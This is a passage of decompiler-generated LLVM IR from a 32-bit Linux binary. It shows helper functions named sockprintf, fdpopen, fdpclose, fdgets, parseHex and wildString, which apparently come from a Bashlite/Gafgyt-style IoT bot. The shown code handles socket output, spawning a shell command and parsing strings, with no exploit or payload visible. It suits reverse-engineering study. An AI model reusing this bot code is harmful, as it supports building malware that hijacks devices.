  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 40, 3, 2, 45, 46, 1, 0, 47, 48, 49, 50, 51, 52, 53, 54, 5, 4 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_805f540.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v0_804893a = call i32 @getdtablesize()
  %tmp37 = icmp slt i32 %v0_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v0_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_805f540.13, align 64
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v0_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v1_8048998 = call i32 @__vfork(i32 %tmp23)
  %v13_80489a6 = icmp eq i32 %v1_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v1_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8057b05.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_80577bb.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8057b02.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_805f540.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v1_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_805f540.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_805f540.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_805f540.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805f540.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd56 = ptrtoint i8* %arg1 to i32
  %v2_8048cd87 = load i8, i8* %arg1, align 1
  %v4_8048cda11 = icmp eq i8 %v2_8048cd87, 0
  br i1 %v4_8048cda11, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.012, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.013, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8057b20.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd514, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd514 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd56, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.012 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.012, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.012, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.012, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
